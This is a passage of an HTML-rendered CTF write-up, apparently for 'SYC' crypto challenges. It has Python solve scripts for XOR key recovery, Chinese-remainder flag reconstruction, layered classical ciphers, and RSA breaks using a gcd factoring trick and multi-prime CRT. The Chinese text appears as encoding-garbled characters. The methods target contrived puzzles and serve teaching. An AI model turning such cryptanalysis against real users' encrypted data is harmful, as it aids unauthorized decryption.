s2<span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    c3 <span class=\"token operator\">=</span> s3<span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    m_ <span class=\"token operator\">=</span> s4<span class=\"token punctuation\">(</span>c3<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token keyword\">if</span> HACK <span class=\"token operator\">==</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"48\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c3<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>k1<span class=\"token punctuation\">,</span>k2 <span class=\"token operator\">=</span> s0<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"53\"></td><td><pre>encrypt_<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">,</span>k1<span class=\"token punctuation\">,</span>k2<span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"56\"></td><td><pre>b'\\xdbi\\xab\\x8d\\xfb0\\xd3\\xfe!\\xf8Xpy\\x80w\\x8c\\x87\\xb9'</pre></td></tr><tr><td data-num=\"57\"></td><td><pre>b'o\\xb0%\\xfb\\xdb\\x0e\\r\\x04\\xde\\xd1\\x9a\\x08w\\xda4\\x0f\\x0cR'</pre></td></tr><tr><td data-num=\"58\"></td><td><pre>b'\\xe7\\x80\\xcd\\ria\\xb2\\xca\\x89\\x1a\\x9d;|#3\\xf7\\xbb\\x96'</pre></td></tr><tr><td data-num=\"59\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> xor </pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>C1<span class=\"token operator\">=</span><span class=\"token string\">b'\\xdbi\\xab\\x8d\\xfb0\\xd3\\xfe!\\xf8Xpy\\x80w\\x8c\\x87\\xb9'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>C2<span class=\"token operator\">=</span><span class=\"token string\">b'o\\xb0%\\xfb\\xdb\\x0e\\r\\x04\\xde\\xd1\\x9a\\x08w\\xda4\\x0f\\x0cR'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>C3<span class=\"token operator\">=</span><span class=\"token string\">b'\\xe7\\x80\\xcd\\ria\\xb2\\xca\\x89\\x1a\\x9d;|#3\\xf7\\xbb\\x96'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>K1<span class=\"token operator\">=</span>xor<span class=\"token punctuation\">(</span>C2<span class=\"token punctuation\">,</span>C3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>K2<span class=\"token operator\">=</span>xor<span class=\"token punctuation\">(</span>C2<span class=\"token punctuation\">,</span>C1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>flag<span class=\"token operator\">=</span>xor<span class=\"token punctuation\">(</span>K1<span class=\"token punctuation\">,</span>C1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"oldalgorithm\"><a class=\"markdownIt-Anchor\" href=\"#oldalgorithm\">#</a> OldAlgorithm</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> os </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">b\"SYC&#123;Al3XEI_FAKE_FLAG&#125;\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>pad <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> msg<span class=\"token punctuation\">,</span>padlen<span class=\"token punctuation\">:</span> msg<span class=\"token operator\">+</span>os<span class=\"token punctuation\">.</span>urandom<span class=\"token punctuation\">(</span>padlen<span class=\"token operator\">-</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>flag <span class=\"token operator\">=</span> pad<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">,</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> _ <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token operator\">%</span>i <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> p<span class=\"token punctuation\">]</span> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'p='</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'c='</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p= [58657, 47093, 47963, 41213, 57653, 56923, 41809, 49639, 44417, 38639, 39857, 53609, 55621, 41729, 60497, 44647, 39703, 55117, 44111, 57131, 37747, 63419, 63703, 64007, 46349, 39241, 39313, 44909, 40763, 46727, 34057, 56333]</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>c= [36086, 4005, 3350, 23179, 34246, 5145, 32490, 16348, 13001, 13628, 7742, 46317, 50824, 23718, 32995, 7640, 10590, 46897, 39245, 16633, 31488, 36547, 42136, 52782, 31929, 34747, 29026, 18748, 6634, 9700, 8126, 5197]</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> long_to_bytes</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">chinese_remainder_theorem</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token comment\"># ËÆ°ÁÆóÊ®°Êï∞ÁöÑ‰πòÁßØ</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    N <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> p<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        N <span class=\"token operator\">*=</span> i</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\"># ËÆ°ÁÆóÊØè‰∏™Ê®°Êï∞ÁöÑ‰πòÁßØ</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        Ni <span class=\"token operator\">=</span> N <span class=\"token operator\">//</span> p<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\"># ËÆ°ÁÆóÊ®°ÂèçÂÖÉÁ¥†</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        Mi <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>Ni<span class=\"token punctuation\">,</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token comment\"># ËÆ°ÁÆóÈÉ®ÂàÜËß£ÂØÜÁªìÊûú</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        result <span class=\"token operator\">+=</span> c<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> Ni <span class=\"token operator\">*</span> Mi</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token comment\"># ÂèñÊúÄÂ∞èÊ≠£Êï¥Êï∞Ëß£</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    flag <span class=\"token operator\">=</span> result <span class=\"token operator\">%</span> N</pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">return</span> long_to_bytes<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">58657</span><span class=\"token punctuation\">,</span> <span class=\"token number\">47093</span><span class=\"token punctuation\">,</span> <span class=\"token number\">47963</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41213</span><span class=\"token punctuation\">,</span> <span class=\"token number\">57653</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56923</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41809</span><span class=\"token punctuation\">,</span> <span class=\"token number\">49639</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44417</span><span class=\"token punctuation\">,</span> <span class=\"token number\">38639</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39857</span><span class=\"token punctuation\">,</span> <span class=\"token number\">53609</span><span class=\"token punctuation\">,</span> <span class=\"token number\">55621</span><span class=\"token punctuation\">,</span> <span class=\"token number\">41729</span><span class=\"token punctuation\">,</span> <span class=\"token number\">60497</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44647</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39703</span><span class=\"token punctuation\">,</span> <span class=\"token number\">55117</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44111</span><span class=\"token punctuation\">,</span> <span class=\"token number\">57131</span><span class=\"token punctuation\">,</span> <span class=\"token number\">37747</span><span class=\"token punctuation\">,</span> <span class=\"token number\">63419</span><span class=\"token punctuation\">,</span> <span class=\"token number\">63703</span><span class=\"token punctuation\">,</span> <span class=\"token number\">64007</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46349</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39241</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39313</span><span class=\"token punctuation\">,</span> <span class=\"token number\">44909</span><span class=\"token punctuation\">,</span> <span class=\"token number\">40763</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46727</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34057</span><span class=\"token punctuation\">,</span> <span class=\"token number\">56333</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>c<span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">36086</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4005</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3350</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23179</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34246</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5145</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32490</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16348</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13628</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7742</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46317</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50824</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23718</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32995</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7640</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10590</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46897</span><span class=\"token punctuation\">,</span> <span class=\"token number\">39245</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16633</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31488</span><span class=\"token punctuation\">,</span> <span class=\"token number\">36547</span><span class=\"token punctuation\">,</span> <span class=\"token number\">42136</span><span class=\"token punctuation\">,</span> <span class=\"token number\">52782</span><span class=\"token punctuation\">,</span> <span class=\"token number\">31929</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34747</span><span class=\"token punctuation\">,</span> <span class=\"token number\">29026</span><span class=\"token punctuation\">,</span> <span class=\"token number\">18748</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6634</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9700</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8126</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5197</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>flag <span class=\"token operator\">=</span> chinese_remainder_theorem<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"easy_classic\"><a class=\"markdownIt-Anchor\" href=\"#easy_classic\">#</a> easy_classic</h3>\n<p>Âè§ÂÖ∏ÂØÜÁ†ÅÁöÑÂ•ó</p>\n<p>Á¨¨‰∏ÄÂ±ÇÔºö udzeojxuwqcu</p>\n<p>ÂáØÊíí 16Ôºöenjoythegame</p>\n<p>Á¨¨‰∫åÂ±ÇÔºöialhhooavtepcyr</p>\n<p>Ê†ÖÊ†è 7Ôºöilovecryptohaha</p>\n<p>Á¨¨‰∏âÂ±ÇÔºö5a6H5a6Z5LiH5rOV55qE6YKj5Liq5rqQ5aS0</p>\n<p>base64: ÂÆáÂÆô‰∏áÊ≥ïÁöÑÈÇ£‰∏™Ê∫êÂ§¥</p>\n<p>Á¨¨ÂõõÂ±ÇÔºöÂëãÈ£üÈ£üÈ£üÂèñÂôóÂ±±Á¨®Á¨®Á†¥ÂóÑÂíØÂìàÂãïÂó°ÈõúÈ°ûÂóíÂòøÂïΩÊ≤íÊ≠°Á†¥ÂêñÂí¨ÊàëÂïΩÂØ∂ÁõúÂôîÂíØÊ≤í</p>\n<p>ÁÜäÊõ∞Ëß£ÂØÜÔºönever gonna give you up</p>\n<p>Á¨¨‰∫îÂ±ÇÔºöüëùüëòüë†üë©üëûüëòüë§üëú</p>\n<p>base100 Êâæ key:fairgame</p>\n<p>Ê†πÊçÆ fairgame ÂæóÁü•Âä†ÂØÜ‰∏∫ PlayfairÔºögenshinstart</p>\n<pre><code>SYC&#123;classical_1s_fun&#125;\n</code></pre>\n<h3 id=\"polyrsa\"><a class=\"markdownIt-Anchor\" href=\"#polyrsa\">#</a> PolyRSA</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> math</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> inverse</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">728002565949733279371529990942440022467681592757835980552797682116929657292509059813629423038094227544032071413317330087468458736175902373398210691802243764786251764982802000867437756347830992118278032311046807282193498960587170291978547754942295932606784354258945168927044376692224049202979158068158842475322825884209352566494900083765571037783472505580851500043517614314755340168507097558967372661966013776090657685241689631615245294004694287660685274079979318342939473469143729494106686592347327776078649315612768988028622890242005700892937828732613800620455225438339852445425046832904615827786856105112781009995862999853122308496903885748394541643702103368974605177097553007573113536089894913967154637055293769061726082740854619536748297829779639633209710676774371525146758917646731487495135734759201537358734170552231657257498090553682791418003138924472103077035355223367678622115314235119493397080290540006942708439607767313672671274857069053688258983103863067394473084183472609906612056828326916114024662795812611685559034285371151973580240723680736227737324052391721149957542711415812665358477474058103338801398214688403784213100455466705770532894531602252798634923125974783427678469124261634518543957766622712661056594132089</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">375617816311787295279632219241669262704366237192565344884527300748210925539528834207344757670998995567820735715933908541800125317082581328287816628816752542104514363629022246620070560324071543077301256917337165566677142545053272381990573611757629429857842709092285442319141751484248315990593292618113678910350875156232952525787082482638460259354559904243062546518553607882194808191571131590524874275187750985821420412987586148770397073003186510357920710387377990379862185266175190503647626248057084923516190642292152259727446111686043531725993433395002330208067534104745851308178560234372373476331387737629284961288204368572750848248186692623500372605736825205759172773503283282321274793846281079650686871355211691681512637459986684769598186821524093789286661348936784712071312135814683041839882338235290487868969391040389837253093468883093296547473466050960563347060307256735803099039921213839491129726807647623542881247210251994139130146519265086673883077644185971830004165931626986486648581644383717994174627681147696341976767364316172091139507445131410662391699728189797082878876950386933926807186382619331901457205957462337191923354433435013338037399565519987793880572723211669459895193009710035003369626116024630678400746946356</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e1 <span class=\"token operator\">=</span> <span class=\"token number\">113717</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>e2 <span class=\"token operator\">=</span> <span class=\"token number\">80737</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>c1 <span class=\"token operator\">=</span> <span class=\"token number\">97528398828294138945371018405777243725957112272614466238005409057342884425132214761228537249844134865481148636534134025535106624840957740753950100180978607132333109806554009969378392835952544552269685553539656827070349532458156758965322477969141073720173165958341043159560928836304172136610929023123638981560836183245954461041167802574206323129671965436040047358250847178930436773249800969192016749684095882580749559014647942135761757750292281205876241566597813517452803933496218995755905344070203047797893640399372627351254542342772576533524820435965479881620338366838326652599102311019884528903481310690767832417584600334987458835108576322111553947045733143836419313427495888019352323209000292825566986863770366023326755116931788018138432898323148059980463407567431417724940484236335082696026821105627826117901730695680967455710434307270501190258033004471156993017301443803372029004817834317756597444195146024630164820841200575179112295902020141040090350486764038633257871003899386340004440642516190842086462237559715130631205046041819931656962904630367121414263911179041905140516402771368603623318492074423223885367923228718341206283572152570049573607906130786276734660847733952210105659707746969830132429975090175091281363770357</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>c2 <span class=\"token operator\">=</span> <span class=\"token number\">353128571201645377052005694809874806643786163076931670184196149901625274899734977100920488129375537186771931435883114557320913415191396857882995726660784707377672210953334914418470453787964899846194872721616628198368241044602144880543115393715025896206210152190007408112767478800650578941849344868081146624444817544806046188600685873402369145450593575618922226415069043442295774369567389939040265656574664538667552522329712111984168798829635080641332045614585247317991581514218486004191829362787750803153463482021229058714990823658655863245025037102127138472397462755776598314247771125981017814912049441827643898478473451005083533693951329544115861795587564408860828213753948427321483082041546722974666875065831843384005041800692983406353922680299538080900818930589336142421748023025830846906503542594380663429947801329079870530727382679634952272644949425079242992486832995962516376820051495641486546631849426876810933393153871774796182078367277299340503872124124714036499367887886486264658590613431293656417255355575602576047502506125375605713228912611320198066713358654181533335650785578352716562937038768171269136647529849805172492594142026261051266577821582011917001752590659862613307646536049830151262848916867223615064832279222</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>q <span class=\"token operator\">=</span> math<span class=\"token punctuation\">.</span>gcd<span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">,</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span> e2<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span>e1<span class=\"token operator\">*</span>e2<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span> e1<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span>e1<span class=\"token operator\">*</span>e2<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p <span class=\"token operator\">=</span> n <span class=\"token operator\">//</span> q</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>d <span class=\"token operator\">=</span> inverse<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>d<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">.</span>fromhex<span class=\"token punctuation\">(</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span><span class=\"token string\">'x'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"fi1nd_th3_x\"><a class=\"markdownIt-Anchor\" href=\"#fi1nd_th3_x\">#</a> Fi1nd_th3_x‚Äô</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> functools <span class=\"token keyword\">import</span> <span class=\"token builtin\">reduce</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p<span class=\"token operator\">=</span> <span class=\"token number\">13014610351521460822156239705430709078128228907778181478242620569429327799535062679140131416771915929573454741755415612880788196172134695027201422226050343</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>q<span class=\"token operator\">=</span> <span class=\"token number\">12772373441651008681294250861077909144300908972709561019514945881228862913558543752401850710742410181542277593157992764354184262443612041344749961361188667</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r<span class=\"token operator\">=</span> <span class=\"token number\">12128188838358065666687296689425460086282352520167544115899775800918383085863282204525519245937988837403739683061218279585168168892037039644924073220678419</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>dp<span class=\"token operator\">=</span> <span class=\"token number\">116715737414908163105708802733763596338775040866822719131764691930369001776551671725363881836568414327815420649861207859100479999650414099346914809923964116101517432576562641857767638396325944526867458624878906968552835814078216316470330511385701105459053294771612727181278955929391807414985165924450505855941</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>dq<span class=\"token operator\">=</span> <span class=\"token number\">44209639124029393930247375993629669338749966042856653556428540234515804939791650065905841618344611216577807325504984178760405516121845853248373571704473449826683120387747977520655432396578361308033763778324817416507993263234206797363191089863381905902638111246229641698709383653501799974217118168526572365797</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>dr<span class=\"token operator\">=</span> <span class=\"token number\">60735172709413093730902464873458655487237612458970735840670987186877666190533417038325630420791294593669609785154204677845781980482700493870590706892523016041087206844082222225206703139282240453277802870868459288354322845410191061009582969848870045522383447751431300627611762289800656277924903605593069856921</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>c<span class=\"token operator\">=</span> <span class=\"token number\">93063188325241977486352111369210103514669725591157371105152980481620575818945846725056329712195176948376321676112726029400835578531311113991944495646259750817465291340479809938094295621728828133981781064352306623727112813796314947081857025012662546178066873083689559924412320123824601550896063037191589471066773464829226873338699012924080583389032903142107586722373131642720522453842444615499672193051587154108368643495983197891525747653618742702589711752256009</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">union</span><span class=\"token punctuation\">(</span>x1<span class=\"token punctuation\">,</span> x2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    a1<span class=\"token punctuation\">,</span> m1 <span class=\"token operator\">=</span> x1</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    